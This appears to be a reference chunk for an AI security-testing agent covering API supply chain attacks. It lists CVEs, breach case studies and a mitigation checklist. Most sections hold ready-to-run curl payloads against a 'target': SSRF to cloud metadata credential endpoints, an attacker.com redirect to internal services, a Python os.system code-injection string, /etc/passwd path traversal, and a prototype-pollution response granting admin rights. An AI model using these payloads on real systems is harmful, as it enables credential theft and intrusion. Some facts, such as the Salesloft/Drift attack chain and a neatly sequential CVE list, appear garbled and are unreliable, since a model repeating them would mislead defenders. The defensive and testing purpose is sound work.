# API Supply Chain Attacks — Agent Chunk 81a
> Source: GitGuardian State of Secrets Sprawl 2024, Salesloft/Drift breach reports, CVE databases, Polyfill.io/xz-utils/tj-actions post-mortems
> Purpose: Teaches the agent to identify supply chain risks in API dependencies, third-party integrations, SDKs, and federated architectures
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when assessing third-party API integrations, evaluating SDK security, auditing OAuth-connected services, or reviewing federated API architectures. Supply chain attacks exploit trust relationships between services. Test for SSRF in webhook integrations, credential exposure in OAuth flows, and known vulnerabilities in API SDKs.

---

## 1. Third-Party API SSRF via Webhooks

### CVE-2025-9821: Mautic Marketing Automation
```bash
# Mautic allowed configuring webhook URLs that triggered SSRF
# Used for marketing automation callbacks

# Step 1: Configure webhook pointing to internal service
curl -X POST https://mautic.target.com/api/hooks \
  -H "Authorization: Bearer <token>" \
  -d '{
    "name": "test_hook",
    "webhookUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "triggers": ["mautic.lead_post_save_new"]
  }'

# Step 2: Trigger the event (create a new lead)
curl -X POST https://mautic.target.com/api/contacts/new \
  -d '{"firstname":"test","email":"test@test.com"}'

# Step 3: Webhook fires, response contains AWS credentials
# Retrieved via webhook delivery logs or attacker-controlled endpoint
```

### CVE-2025-57818: Firecrawl Web Scraping API
```bash
# Firecrawl's crawl API followed redirects to internal services
# Scraping endpoint acted as an open SSRF proxy

curl -X POST https://api.firecrawl.dev/v0/scrape \
  -H "Authorization: Bearer <api_key>" \
  -d '{
    "url": "https://attacker.com/redirect-to-internal",
    "formats": ["html"]
  }'
# attacker.com returns 302 to http://metadata.google.internal/...
# Firecrawl follows redirect and returns internal metadata
```

---

## 2. OAuth Credential Theft

### Salesloft / Drift Breach (August 2025)
**Attack Chain:**
```
1. Attacker compromised Drift (chat widget provider) OAuth integration
2. Drift had OAuth tokens granting access to Salesloft customer data
3. OAuth scopes were overly broad: read/write access to all contacts
4. Attacker used Drift's OAuth tokens to exfiltrate Salesloft customer data
5. Affected: ~14,000 Salesloft customers' contact records

Key Lessons:
- Third-party OAuth integrations create lateral movement paths
- OAuth tokens often persist long after active use
- Scope creep: integrations request more permissions than needed
- No monitoring on third-party token usage patterns
```

### Salesforce Breach Patterns
```bash
# Common Salesforce API credential exposure vectors:

# 1. Connected App client secrets in source code
grep -rP 'consumer_secret|client_secret.*3MV' /path/to/repo

# 2. Refresh tokens in logs/config files
grep -rP 'refresh_token.*00D' /path/to/repo

# 3. Session IDs in URLs
# Salesforce session IDs in URL parameters get logged in server access logs
GET /api/data?sid=00D000000000001!AQEAQI... HTTP/1.1

# 4. Test: Does the integration use minimum required OAuth scopes?
curl https://login.salesforce.com/services/oauth2/introspect \
  -d "token=<access_token>&client_id=<client_id>&client_secret=<secret>"
# Check "scope" field for overly broad permissions
```

---

## 3. SDK Vulnerabilities

### LangChain — 12+ CVEs
```
CVE-2023-36188  - Arbitrary code execution via MRKL chain
CVE-2023-36189  - Code injection via PALChain
CVE-2023-32786  - RCE via text-to-SQL
CVE-2023-38896  - SSRF in document loaders
CVE-2023-38897  - Path traversal in CSV loader
CVE-2023-39631  - RCE via JavaScript REPL
CVE-2023-39659  - Code injection via LLMMathChain
CVE-2023-44467  - RCE via serialize/deserialize
CVE-2024-0243   - SSRF via RecursiveURLLoader
CVE-2024-3571   - SSRF via JSONLoader
CVE-2024-21511  - RCE via eval in Python REPL
CVE-2024-28088  - SSRF via web research retriever

# Common pattern: LangChain tools eval() user input
# Test: send template injection through any LangChain-powered endpoint
curl -X POST https://target.com/api/chat \
  -d '{"message":"__import__(\"os\").system(\"id\")"}'
```

### LlamaIndex — 5+ CVEs
```
CVE-2024-45202  - Arbitrary file read via document loaders
CVE-2024-45201  - SSRF via URL reader
CVE-2024-45200  - Code injection via eval
CVE-2024-45199  - Path traversal
CVE-2024-45198  - Deserialization RCE

# Test: path traversal in document ingestion
curl -X POST https://target.com/api/ingest \
  -d '{"file_path": "../../../../etc/passwd"}'
```

### Solana web3.js Compromise (December 2024)
```
Timeline:
- Attacker compromised npm publish credentials for @solana/web3.js
- Published versions 1.95.6 and 1.95.7 with backdoor
- Backdoor exfiltrated private keys via hardcoded C2 domain
- Estimated $160K stolen before detection and rollback

Relevance to API security:
- Any API server using compromised version leaked its Solana keys
- Supply chain attack targeted the most popular Solana SDK
- Detection required comparing package checksums against source
```

---

## 4. GraphQL Federation — Prototype Pollution

### CVE-2026-32621: Apollo Gateway (CVSS 9.9)
```graphql
# Compromised subgraph returns prototype pollution payload
# in its GraphQL response to the Apollo Gateway

# Malicious subgraph schema:
type Query {
  user(id: ID!): User
}

type User {
  id: ID!
  name: String
  # Subgraph returns __proto__ in extension data
}

# Malicious subgraph response:
{
  "data": {
    "user": {
      "id": "1",
      "name": "test"
    }
  },
  "extensions": {
    "__proto__": {
      "isAdmin": true,
      "role": "superadmin"
    }
  }
}

# Gateway merges subgraph responses, polluting Object.prototype
# All subsequent requests in the gateway process inherit isAdmin=true
```

**Impact:** A single compromised subgraph in a federated GraphQL architecture could escalate privileges for all users across all subgraphs.

---

## 5. LiteLLM — 6+ Critical CVEs

```
CVE-2024-6587   - SSRF via /chat/completions (proxy mode)
CVE-2024-4888   - Server-side template injection
CVE-2024-5751   - RCE via code execution endpoint
CVE-2024-5714   - Authentication bypass in admin panel
CVE-2024-5225   - SSRF via model configuration
CVE-2024-4889   - Arbitrary code execution

# LiteLLM acts as an API proxy, making SSRF particularly dangerous
curl -X POST https://litellm.target.com/chat/completions \
  -H "Authorization: Bearer <key>" \
  -d '{
    "model": "gpt-3.5-turbo",
    "api_base": "http://169.254.169.254/latest/",
    "messages": [{"role":"user","content":"test"}]
  }'
```

---

## 6. Compromised API Keys at Scale

### GitGuardian 2024 Report
```
- 23.8 million new secrets detected in public GitHub repos in 2024
- 543,000 secrets still valid when tested
- Top leaked secret types:
  1. Generic API keys/tokens (38%)
  2. Google API keys (14%)
  3. AWS credentials (9%)
  4. GitHub tokens (8%)
  5. Database connection strings (6%)
  6. Stripe/payment keys (4%)

# Detection: scan for exposed keys
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect --source /path/to/repo
```

---

## 7. Major Supply Chain Case Studies

### Polyfill.io (June 2024)
```
- Chinese company acquired polyfill.io domain and CDN
- Injected malicious code into polyfill.js served to 100K+ sites
- Malicious code redirected mobile users to scam sites
- Affected any API frontend loading polyfills from the CDN
- Detection: check if any API documentation/portals load polyfill.io
```

### xz Utils (March 2024 — CVE-2024-3094)
```
- Backdoor inserted into xz compression library (versions 5.6.0-5.6.1)
- Targeted sshd authentication via systemd linkage
- Would have affected any API server running on compromised Linux distros
- Social engineering campaign over 2+ years to gain maintainer trust
```

### tj-actions/changed-files (March 2025)
```
- GitHub Action compromised to exfiltrate CI/CD secrets
- Any repo using the action leaked secrets in workflow logs
- API keys, tokens, and credentials in CI/CD pipelines exposed
- 23,000+ repos potentially affected
```

---

## 8. Mitigation Checklist
- Audit all third-party API integrations quarterly; revoke unused OAuth grants
- Pin SDK/library versions; monitor for CVEs in dependencies
- Implement egress filtering to prevent SSRF from internal services
- Use minimum-privilege OAuth scopes for all integrations
- Rotate API keys after any supply chain incident affecting dependencies
- Validate all data from federated subgraphs; sanitize GraphQL extensions
- Scan repositories for leaked secrets continuously (pre-commit hooks + CI)
- Verify package integrity (checksums/signatures) before deployment
